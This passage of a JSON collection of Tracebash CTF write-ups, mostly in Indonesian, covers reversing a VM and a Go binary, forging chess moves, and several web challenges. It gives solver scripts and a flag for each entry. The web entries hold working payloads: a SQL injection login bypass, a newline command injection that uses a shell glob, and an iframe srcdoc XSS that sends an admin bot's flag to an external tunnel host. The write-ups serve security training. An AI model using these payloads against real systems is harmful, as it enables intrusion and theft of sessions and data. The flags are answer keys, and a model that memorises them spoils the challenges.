        "content": "Sebelum interpreter berjalan, `main` membuat tabel 256 byte:\n\n\n\nSetiap byte challenge didekripsi dengan:\n\n\n\nEmpat byte pertama setelah dekripsi:\n\n\n\nOpcode aktual dihitung saat runtime:\n\n\n\nKey awal adalah `0xAA`, jadi `0xBE ^ 0xAA = 0x14`, yaitu `MOV`.",
        "code": "key_table[i] = ((13 * i) & 0xff) ^ 0x37"
      },
      {
        "title": "Opcode key dan payload berlapis",
        "content": "Instruksi `MKEY` mengubah key seperti ini:\n\n\n\nUrutan key selama eksekusi:\n\n\n\nAlur payload:\n\n\n\nBytecode stage pertama juga menulis `0x1B` ke alamat `0x0050`. Itu mengubah instruksi lama dan mencegah analisis yang hanya mengandalkan disassembly statis.",
        "code": "opcode_key = rol8(opcode_key, 3) ^ 0x5a"
      },
      {
        "title": "Input dan jalur palsu",
        "content": "VM membaca tepat 15 byte ke `0x2010`:\n\n\n\nLalu delapan byte disalin:\n\n\n\nValidator akhir memeriksa prefix berikut:\n\n\n\nJika cocok, program mencetak `N` dan berhenti. Jalur ini sengaja dibuat sebagai decoy. Prefix lain lanjut ke checksum.",
        "code": "input[0] ... input[14]"
      },
      {
        "title": "Checksum sebenarnya",
        "content": "State awal:\n\n\n\nDelapan byte `input[6:14]` diproses dengan:\n\n\n\nTarget dibangun oleh bytecode sebagai:\n\n\n\nPreimage alphanumeric/underscore yang relevan dengan opcode dan tema self-modifying VM adalah:\n\n\n\nCek langsung:\n\n\n\nKarena byte `0..5` dan byte `14` tidak masuk checksum, solver memilih filler:\n\n\n\nPanjang inner key tetap 15 byte dan tidak memicu prefix palsu `LEET`.",
        "code": "state = 0x1337"
      },
      {
        "title": "Solver",
        "content": "Output:\n\n\n\n`solve.py` melakukan brute force empat karakter terakhir setelah prefix core `r0r_`, membangun inner key 15 byte, lalu menjalankan `vm challenge.bin` untuk memastikan output berakhir dengan `C`.",
        "code": "python3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Solver for TBCTF 2026 Reverse - Rotating Cogs.\r\n\r\nThe VM reads 15 bytes, but the real verifier only hashes input[6:14].\r\nThe first four bytes form a fake LEET branch, while the remaining ignored\r\npositions can be chosen freely.\r\n\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport itertools\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\nTARGET = 0x817ECE73\r\nALPHABET = b\"abcdefghijklmnopqrstuvwxyz0123456789_\"\r\nCORE_PREFIX = b\"r0r_\"\r\nFLAG_PREFIX = b\"c0gs__\"\r\nFLAG_SUFFIX = b\"!\"\r\n\r\n\r\ndef rol32(value: int, bits: int) -> int:\r\n    bits &= 31\r\n    value &= 0xFFFFFFFF\r\n    if bits == 0:\r\n        return value\r\n    return ((value << bits) | (value >> (32 - bits))) & 0xFFFFFFFF\r\n\r\n\r\ndef checksum(data: bytes) -> int:\r\n    if len(data) != 8:\r\n        raise ValueError(\"checksum input must be exactly 8 bytes\")\r\n\r\n    state = 0x1337\r\n    for byte in data:\r\n        state ^= byte\r\n        state = rol32(state, 7)\r\n        state = (state + 0x11) & 0xFFFFFFFF\r\n    return state\r\n\r\n\r\ndef recover_core() -> bytes:\r\n    \"\"\"Recover the unique alphanumeric/underscore core beginning with r0r_.\"\"\"\r\n    state = 0x1337\r\n    for byte in CORE_PREFIX:\r\n        state = (rol32(state ^ byte, 7) + 0x11) & 0xFFFFFFFF\r\n\r\n    matches: list[bytes] = []\r\n    for suffix_tuple in itertools.product(ALPHABET, repeat=4):\r\n        candidate_state = state\r\n        for byte in suffix_tuple:\r\n            candidate_state = (\r\n                rol32(candidate_state ^ byte, 7) + 0x11\r\n            ) & 0xFFFFFFFF\r\n\r\n        if candidate_state == TARGET:\r\n            matches.append(CORE_PREFIX + bytes(suffix_tuple))\r\n\r\n    if matches != [b\"r0r_m0d1\"]:\r\n        raise RuntimeError(f\"unexpected core candidates: {matches!r}\")\r\n    return matches[0]\r\n\r\n\r\ndef build_flag() -> bytes:\r\n    core = recover_core()\r\n    inner = FLAG_PREFIX + core + FLAG_SUFFIX\r\n\r\n    if len(inner) != 15:\r\n        raise RuntimeError(f\"inner key length is {len(inner)}, expected 15\")\r\n    if inner[:4] == b\"LEET\":\r\n        raise RuntimeError(\"chosen filler triggers the fake LEET branch\")\r\n    if checksum(inner[6:14]) != TARGET:\r\n        raise RuntimeError(\"constructed key does not satisfy the checksum\")\r\n\r\n    return b\"TBCTF{\" + inner + b\"}\"\r\n\r\n\r\ndef validate_with_vm(flag: bytes) -> bytes | None:\r\n    vm_path = Path(__file__).with_name(\"vm\")\r\n    bytecode_path = Path(__file__).with_name(\"challenge.bin\")\r\n    if not (vm_path.exists() and bytecode_path.exists()):\r\n        return None\r\n\r\n    inner = flag[len(b\"TBCTF{\") : -1]\r\n    proc = subprocess.run(\r\n        [str(vm_path), str(bytecode_path)],\r\n        input=inner,\r\n        stdout=subprocess.PIPE,\r\n        stderr=subprocess.PIPE,\r\n        check=True,\r\n    )\r\n    if not proc.stdout.endswith(b\"C\"):\r\n        raise RuntimeError(\r\n            f\"VM rejected the key: stdout={proc.stdout!r}, stderr={proc.stderr!r}\"\r\n        )\r\n    return proc.stdout\r\n\r\n\r\ndef main() -> None:\r\n    flag = build_flag()\r\n    vm_output = validate_with_vm(flag)\r\n\r\n    print(f\"core     : {flag[12:-2].decode()}\")\r\n    print(f\"checksum : 0x{TARGET:08x}\")\r\n    if vm_output is not None:\r\n        print(f\"vm output: {vm_output!r}\")\r\n    print(f\"<FLAG>{flag.decode()}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{c0gs__r0r_m0d1!}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-rev-something",
    "title": "Something (Reverse)",
    "ctfName": "Tracebash",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Something (Reverse)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Ini fungsi validasi sebenarnya:\n\n1. Cek panjang input tengah harus 16 byte persis.\n2. **Reverse** 16 byte itu (swap index `i` dengan `15-i`).\n3. Tiap byte di-**XOR `0xd7`**, lalu di-**XOR `0x2a`** lagi — net-nya sama aja kayak XOR `0xfd`.\n4. Bangun buffer pembanding dari `encExpected`: tiap byte `encExpected[i]` di-XOR sama 6 byte key gabungan (XOR dari konstanta `\"TBCTF{\"` di rodata) terus di-XOR `0x2a` lagi.\n5. Compare byte-per-byte. Kalau cocok semua → return true → `encCorrect`.\n\nDisederhanain: kombinasi reverse + dua XOR berturut sama aja kayak **input_middle[k] = encExpected[15-k] XOR 0xEB** (gabungan net XOR dari kedua sisi).",
    "solution": [
      {
        "title": "Info",
        "content": "- **Binary**: `chall` — ELF 64-bit, statically linked Go binary, not stripped\n- **Flag**: `TBCTF{r3v_x0r_m3mfr0b!}`"
      },
      {
        "title": "Recon",
        "content": "Binary statik Go, debug info masih ada jadi semua nama simbol package `main` kebawa:\nnm chall | grep ' main.'\n\nKetemu beberapa global menarik: `encPrompt`, `encCorrect`, `encIncorrect`, `encExpected`, sama empat `encFakeN`. Semua isinya bukan plaintext — di-encode sama satu byte XOR key. Dump byte mentahnya pakai radare2 (`pxq 16 @ alamat`), terus brute key 1 byte sampe `encPrompt` jadi `\"Enter flag: \"`. Key-nya `0x16`.\n\nDecode semua string pakai key itu, hasilnya:\nPROMPT    : Enter flag:\n\nCORRECT   : Correct! Flag is your input.\n\nINCORRECT : Incorrect flag.\n\nFAKE1     : TBCTF{sh4_h4sh_br0k3n}\n\nFAKE3     : TBCTF{rs4_pr1v4t3_k3y}\n\nFAKE4     : TBCTF{hm4c_s1gn3d}\n\nFAKE5     : TBCTF{bl0wf1sh_c1ph3r}\n\n`encExpected` tetap non-printable walau di-XOR `0x16` — berarti bukan plaintext langsung, ada layer encoding lain. Empat `FAKE*` itu decoy: nama-nama algoritma crypto (SHA, RSA, HMAC, Blowfish) sengaja dipasang biar reverser kebuang waktu nyari implementasi crypto yang sebenernya gak dipakai."
      },
      {
        "title": "Exploit",
        "content": "Output: `TBCTF{r3v_x0r_m3mfr0b!}`\n\nValidasi langsung ke binary:\n\n$ echo \"TBCTF{r3v_x0r_m3mfr0b!}\" | ./chall\n\nEnter flag: Correct! Flag is your input.",
        "code": "enc_expected = bytes([\n    0xca, 0x89, 0xdb, 0x99, 0x8d, 0x86, 0xd8, 0x86,\n    0xb4, 0x99, 0xdb, 0x93, 0xb4, 0x9d, 0xd8, 0x99,\n])\nmiddle = bytes(enc_expected[15 - k] ^ 0xEB for k in range(16))\nflag = \"TBCTF{\" + middle.decode() + \"}\"\nprint(flag)"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "enc_expected = bytes([0xca,0x89,0xdb,0x99,0x8d,0x86,0xd8,0x86,\r\n                       0xb4,0x99,0xdb,0x93,0xb4,0x9d,0xd8,0x99])\r\n\r\ntarget = bytes([b ^ 0x16 for b in enc_expected])  # decoded comparison buffer\r\n\r\n# reverse: input_middle[k] = target_reversed... derive directly\r\nmiddle = bytearray(16)\r\nfor k in range(16):\r\n    middle[k] = enc_expected[15-k] ^ 0xEB\r\n\r\nflag = \"TBCTF{\" + middle.decode() + \"}\"\r\nprint(flag)"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{r3v_x0r_m3mfr0b!}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-web-cheesechess",
    "title": "Cheese Chess",
    "ctfName": "Tracebash",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Aplikasi catur online berbasis React/Express yang menjalankan engine catur Stockfish di sisi client.",
    "problemDescription": "Aplikasi catur online berbasis React/Express yang menjalankan engine catur Stockfish di sisi client. Karena game state disinkronisasi lewat WebSocket dari client ke server, kita bisa memanipulasi jalannya permainan dan memenangkan game dengan mudah.",
    "tools": [],
    "analysis": "1. File JavaScript client-side (`index.js`) di-obfuscate menggunakan `javascript-obfuscator` standar.\n2. Setiap kali move dikirim ke server lewat WebSocket, client menyertakan signature `sig` untuk memvalidasi keaslian move.\n3. Setelah deobfuscasi string bundle JS, fungsi `Ge` yang menghitung `sig` didefinisikan sebagai MD5 hash dari string template berikut:\n   ```\n   {sessionId}|{moveNumber}|{from}|{to}|{nonce}\n   ```\n   * `sessionId` diperoleh dari pesan `init` server.\n   * `moveNumber` adalah index move (dimulai dari 0).\n   * `from` dan `to` adalah posisi petak move.\n   * `nonce` dikirim di awal pesan `init` (ter-encode Base64 `Y2gzM3N5X3MzY3IzdF8yMDI0` -> `ch33sy_s3cr3t_2024`).",
    "solution": [
      {
        "title": "Eksploitasi",
        "content": "Karena server mempercayai move yang dikirim dari client selama signature MD5-nya cocok, kita bisa bermain di kedua sisi (White & Black) langsung lewat client WebSocket custom untuk memenangkan permainan dengan Scholar's Mate secara legal dalam 8 move:\n1. Hubungkan ke WebSocket target `wss://web-cheese-chess.tracebash.xyz/ws`.\n2. Dapatkan `sessionId` dan `nonce` dari server response `init`.\n3. Kirim sequence move berikut dengan signature MD5 yang valid untuk setiap move:\n   - Move 0 (w): e2 -> e4\n   - Move 1 (b): e7 -> e5\n   - Move 2 (w): a2 -> a3 (move useless legal)\n   - Move 3 (b): d8 -> h4\n   - Move 4 (w): h2 -> h3 (move useless legal)\n   - Move 5 (b): f8 -> c5\n   - Move 6 (w): a3 -> a4 (move useless legal)\n   - Move 7 (b): h4 -> f2 (checkmate!)\n4. Server memvalidasi checkmate dan mengembalikan flag."
      }
    ],
    "flag": "TBCTF{n3v3r_tru5t_th3_ch33sy_cl13nt}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-web-madnnes",
    "title": "Madness",
    "ctfName": "Tracebash",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini gabung dua hal: login SQL injection buat nyolong sesi admin, lalu stego di `favicon` yang dibuka pakai passphrase dari halaman admin.",
    "problemDescription": "Challenge ini gabung dua hal: login SQL injection buat nyolong sesi admin, lalu stego di `favicon` yang dibuka pakai passphrase dari halaman admin.",
    "tools": [],
    "analysis": "Halaman utama redirect ke `/login`. Setelah bikin akun biasa, surface yang kelihatan:\n\n- `/gallery`\n- `/profile`\n- `/admin_only`\n\nKomentar di `/admin_only` ngasih hint kalau ada password yang tersembunyi dan flag bukan ada langsung di halaman itu.",
    "solution": [
      {
        "title": "2. Temu SQL injection di login",
        "content": "Payload ini bikin login lolos:\n\n\n\nKalau sesi hasil payload itu dipakai ke `/profile`, profil yang kebuka adalah user admin:\n\n\n\nOutput pentingnya:",
        "code": "curl -sk -c adminreal.txt -X POST https://web-madness.tracebash.xyz/login \\\n  --data-urlencode \"username=' OR username='admin' -- \" \\\n  --data-urlencode 'password=x' -i"
      },
      {
        "title": "3. Ambil passphrase dari admin page",
        "content": "Dengan sesi admin hasil SQLi, buka `/admin_only`:\n\n\n\nDi sana ada secret:\n\n\n\nHalaman yang sama juga bilang:\n\n\n\n`/robotsss.txt` cuma decoy, tapi hint \"uploaded by admins only\" ngedorong ke file gambar/stego.",
        "code": "curl -sk -b adminreal.txt https://web-madness.tracebash.xyz/admin_only"
      },
      {
        "title": "4. Extract stego dari favicon",
        "content": "`/favicon.ico` ternyata bukan file ico, tapi JPEG. Passphrase dari admin page bisa dipakai buat extract data tersembunyi:\n\n\n\nOutput:",
        "code": "curl -sk https://web-madness.tracebash.xyz/favicon.ico -o fav.ico\nfile fav.ico\nsteghide extract -sf fav.ico -p 'M4dn3sS!' -xf stego_out\ncat stego_out"
      },
      {
        "title": "Solve script",
        "content": "Jalankan:",
        "code": "import re\nimport subprocess\nfrom pathlib import Path\n\nBASE = \"https://web-madness.tracebash.xyz\"\n\n\ndef sh(cmd: str) -> str:\n    return subprocess.check_output(cmd, shell=True, text=True).strip()\n\n\ncookie_file = Path(\"adminreal.txt\")\nfavicon_file = Path(\"fav.ico\")\nout_file = Path(\"stego_out\")\n\nsh(\n    \"curl -sk -c adminreal.txt -X POST \"\n    f\"{BASE}/login \"\n    \"--data-urlencode \\\"username=' OR username='admin' -- \\\" \"\n    \"--data-urlencode 'password=x' >/dev/null\"\n)\n\nadmin_page = sh(f\"curl -sk -b {cookie_file} {BASE}/admin_only\")\npassphrase = re.search(r\\\">(M4dn3sS!)<\", admin_page).group(1)\n\nsh(f\"curl -sk {BASE}/favicon.ico -o {favicon_file}\")\nsh(f\"steghide extract -sf {favicon_file} -p '{passphrase}' -xf {out_file} -f >/dev/null\")\n\nprint(out_file.read_text().strip())"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{1_5u5p3c7_y0u_4r3_4n_0v3r7h1nk3r}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-web-pingme",
    "title": "Ping Me",
    "ctfName": "Tracebash",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Target: https://web-ping-me.tracebash.xyz/",
    "problemDescription": "Target: https://web-ping-me.tracebash.xyz/",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkas",
        "content": "Bug ada di validasi input backend. Filter regex pakai `re.match(r\"^[\\\\d.]+$\", ip, flags=re.MULTILINE)`.\nKarena pakai `MULTILINE`, cukup baris pertama yang valid. Baris berikutnya bisa jadi command baru.\n\nInput juga dibatasi 15 char dan huruf ditolak. Tapi glob shell masih bisa dipakai tanpa huruf.\n`/app/readflag` bisa ditulis jadi `/???/????????` dan panjang total payload masih muat."
      },
      {
        "title": "Titik vuln",
        "content": "Potongan penting di `app.py`:\n\n- cek huruf: `any(c.isalpha() for c in ip)`\n- regex: `re.match(r\"^[\\d.]+$\", ip, flags=re.MULTILINE)`\n- eksekusi shell: `subprocess.check_output(command, shell=True, executable='/bin/bash', ...)`\n\nMasalah inti:\n\n1. `re.match(..., MULTILINE)` cuma butuh awal string cocok.\n2. Newline tidak ditolak.\n3. Input masuk ke `shell=True`.\n4. Path binary bisa dibentuk pakai wildcard tanpa huruf."
      },
      {
        "title": "Ide exploit",
        "content": "Pakai payload dua baris:\n\n`0\\n/???/????????`\n\nBaris 1:\n- `0`\n- lolos regex `^[\\d.]+$`\n- dipakai buat `ping`\n\nBaris 2:\n- `/???/????????`\n- di-expand shell jadi `/app/readflag`\n- binary SUID ini print env `FLAG`\n\nCommand final di server jadi bentuk begini:\n\n`ping -c 1 -W 2 0`\n`/app/readflag`"
      },
      {
        "title": "Exploit",
        "content": "Command uji:",
        "code": "python3 - <<'PY'\nimport requests\nurl='https://web-ping-me.tracebash.xyz/api/ping'\npayload='0\\n/???/????????'\nr=requests.post(url,data=payload,headers={'Content-Type':'text/plain'},timeout=10)\nprint(r.text)\nPY"
      },
      {
        "title": "Output",
        "content": "Response berisi hasil ping lalu flag:",
        "code": "{\"output\":\"PING 0 (127.0.0.1) 56(84) bytes of data.\\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms\\n\\n--- 0 ping statistics ---\\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\\nrtt min/avg/max/mdev = 0.027/0.027/0.027/0.000 ms\\nTBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}\\n\"}"
      },
      {
        "title": "Payload kenapa muat",
        "content": "Hitung panjang:\n\n- `0` = 1\n- `\\n` = 1\n- `/???/????????` = 13\n- total = 15\n\nPas dengan limit input server."
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-web-randomcheese",
    "title": "Random Cheese CTF",
    "ctfName": "Tracebash",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Random Cheese CTF",
    "problemDescription": "",
    "tools": [],
    "analysis": "Upon accessing the challenge website, we are presented with a login/register page. After registering and logging in with any user, we land on a dashboard with a \"Spin Wheel!\" button. The goal is to achieve a total score of 85 or more within 10 spins.\n\nInitial tests by spinning the wheel multiple times revealed a crucial behavior:\n1. For any given user, spinning the wheel 10 times (a full game) always yielded the exact same sequence of numbers. For instance, 'bypass_user' consistently got `[6, 1, 8, 9, 10, 8, 9, 3, 1, 4]` (total 59), and 'attack_user' got `[10, 6, 4, 7, 3, 7, 7, 5, 5, 7]` (total 61).\n2. Resetting the game using the `/reset` endpoint did *not* change this sequence for the current user. It only reset the `spins_count` and `current_score` on the server-side, but the underlying pseudo-random number generator (PRNG) state remained tied to the user, effectively restarting the *same* sequence from the beginning.\n3. This implies that the PRNG is seeded based on something unique to the user's session/account, and this seed is re-applied or implicitly managed to produce the same sequence every game. With the observed sequences, it was impossible to reach the target score of 85. This matches the challenge description: \"Tom rigged the system to make sure nobody ever gets THAT lucky...\"",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "Jerry's finally opened his dream cheese shop, and Tom is furious! Every customer gets a lucky draw — spin the wheel 10 times and score 85+ to win the grand meal. But Tom rigged the system to make sure nobody ever gets THAT lucky... or did he?\n\nChallenge: https://web-random-cheese.tracebash.xyz/"
      },
      {
        "title": "Discovering the \"Lucky Number\"",
        "content": "The phrase \"...or did he?\" hinted at a loophole. We explored other endpoints accessible post-login and found `/settings`. This page revealed a \"Current Lucky Number: 242\" and an option to \"Set New Lucky Number (1-1000)\". This was the critical clue! The \"Lucky Number\" is almost certainly the seed for the PRNG.\n\nThe server is likely using Python's `random.seed(lucky_number)` to initialize its PRNG. Since we can control the `lucky_number`, we can control the sequence of random numbers generated."
      },
      {
        "title": "Exploitation: Finding the Winning Seed",
        "content": "The strategy is to find a `lucky_number` (between 1 and 1000) that, when used as a seed, generates a sequence of 10 spins summing to 85 or more. We can do this by bruteforcing locally:\n\n\n\nRunning this script yielded the following:\n`Found winning lucky number! 854 -> Sequence: [6, 6, 9, 9, 10, 8, 10, 9, 10, 10], Total: 87`\n\nSo, `lucky_number = 854` is our winning seed, giving a total score of 87, which is above the 85-point threshold.",
        "code": "import random\n\ndef test_lucky_number(lucky_number):\n    random.seed(lucky_number)\n    spins = []\n    for _ in range(10):\n        # The game generates numbers from 1 to 10 (inclusive)\n        spins.append(random.randrange(1, 11)) \n    return spins, sum(spins)\n\nif __name__ == \"__main__\":\n    for lucky_num in range(1, 1001): # Iterate from 1 to 1000\n        spins, total_score = test_lucky_number(lucky_num)\n        if total_score >= 85:\n            print(f\"Found winning lucky number! {lucky_num} -> Sequence: {spins}, Total: {total_score}\")\n            # Found the first one, no need to check further\n            break"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (exploit.py):",
        "code": "import requests\r\nimport json\r\nimport time\r\n\r\nBASE_URL = \"https://web-random-cheese.tracebash.xyz\"\r\n\r\ndef register_and_login(username, password):\r\n    session = requests.Session()\r\n    \r\n    # Register\r\n    register_url = f\"{BASE_URL}/register\"\r\n    session.post(register_url, data={\"username\": username, \"password\": password})\r\n\r\n    # Login\r\n    login_url = f\"{BASE_URL}/login\"\r\n    response = session.post(login_url, data={\"username\": username, \"password\": password}, allow_redirects=False)\r\n    \r\n    if response.status_code == 302 and response.headers.get(\"Location\") == \"/\":\r\n        # Follow redirect to fully establish session (optional, but good practice)\r\n        session.get(f\"{BASE_URL}/\") \r\n        return session\r\n    else:\r\n        print(f\"Login failed for {username}. Status: {response.status_code}, Location: {response.headers.get('Location')}\")\r\n        return None\r\n\r\ndef spin_wheel(session):\r\n    spin_url = f\"{BASE_URL}/spin\"\r\n    try:\r\n        response = session.post(spin_url, json={})\r\n        response.raise_for_status() # Raise an exception for HTTP errors\r\n        data = response.json()\r\n        return data\r\n    except requests.exceptions.RequestException as e:\r\n        print(f\"Spin failed: {e}\")\r\n        return None\r\n\r\ndef get_spins_sequence(username, password, num_spins=10):\r\n    session = register_and_login(username, password)\r\n    if not session:\r\n        return []\r\n    \r\n    values = []\r\n    for _ in range(num_spins):\r\n        spin_result = spin_wheel(session)\r\n        if spin_result and spin_result.get(\"val\") is not None:\r\n            values.append(spin_result.get(\"val\"))\r\n        time.sleep(0.1) # small delay to avoid rate limits, if any\r\n    \r\n    return values\r\n\r\nif __name__ == \"__main__\":\r\n    print(\"Getting spin sequence for user1...\")\r\n    user1_spins = get_spins_sequence(\"user1\", \"pass1\")\r\n    print(f\"User1 spins: {user1_spins}\")\r\n    \r\n    time.sleep(1) # wait a second\r\n    \r\n    print(\"\\nGetting spin sequence for user2...\")\r\n    user2_spins = get_spins_sequence(\"user2\", \"pass2\")\r\n    print(f\"User2 spins: {user2_spins}\")\r\n\r\n    print(\"\\nGetting spin sequence for user3 (fast after user2)...\\n\")\r\n    user3_spins = get_spins_sequence(\"user3\", \"pass3\")\r\n    print(f\"User3 spins: {user3_spins}\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{t0m_4nd_j3rry_l0v3s_ch33s3_4nd_r4nd0mness}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-web-trustedrules",
    "title": "Trusted Rules",
    "ctfName": "Tracebash",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Trusted Rules",
    "problemDescription": "",
    "tools": [],
    "analysis": "Potongan penting di template:\n\n```html\nsafe = safe.replace(/<\\/?script>/ig, '');\nsafe = safe.replace(/javascript:/ig, '');\nsafe = safe.replace(/on[a-z]+\\s*=/ig, '');\ndocument.getElementById('note-content').innerHTML = policy.createHTML(userNote);\n```\n\nRegex itu tidak menyentuh atribut `srcdoc`. Payload seperti ini masih lolos:\n\n```html\n<iframe srcdoc=\"&lt;script&gt;top.location='https://attacker/'&lt;/script&gt;\"></iframe>\n```\n\nSaat browser merender `iframe`, isi `srcdoc` dibuka sebagai dokumen `about:srcdoc`. Script di dokumen itu bisa jalan dan tetap punya akses same-origin ke aplikasi utama, jadi `fetch('/admin/flag')` ikut membawa cookie `admin_session` milik bot.",
    "solution": [
      {
        "title": "Ringkas",
        "content": "Bug utamanya ada di `/view`. Input `rule` dimasukkan ke `innerHTML` setelah \"sanitasi\" regex yang cuma buang `<script>`, `javascript:`, dan atribut event handler. Itu masih bisa dibypass pakai `iframe srcdoc`, karena string di dalam `srcdoc` di-decode lagi jadi dokumen baru dan `<script>` di dalamnya tetap jalan.\n\nBot admin mengunjungi URL yang kita submit lewat `/report` selama host dan port cocok dengan `http://web:5000`. Endpoint `/report` sendiri me-rewrite `localhost` ke `web:5000`, jadi URL publik `http://localhost:5000/...` tetap diterima bot."
      },
      {
        "title": "1. Siapkan endpoint penerima",
        "content": "Saya pakai HTTP server lokal dan reverse tunnel `localhost.run` supaya request dari bot bisa dicatat.\n\n\n\nMisal tunnel yang keluar:",
        "code": "python3 -m http.server 8003\nssh -R 80:localhost:8003 nokey@localhost.run"
      },
      {
        "title": "2. Buat payload XSS",
        "content": "Payload final:\n\n\n\nURL yang dikirim ke `/report`:\n\n\n\nKirim dengan:",
        "code": "<iframe srcdoc=\"&lt;script&gt;fetch('/admin/flag').then(r=>r.text()).then(f=>top.location='https://8edc256df28737.lhr.life/'+encodeURIComponent(f))&lt;/script&gt;\"></iframe>"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{rules_c4n_b3_byp4ss3d_1f_y0u_kn0w_h0w}",
    "lessonsLearned": []
  }
];
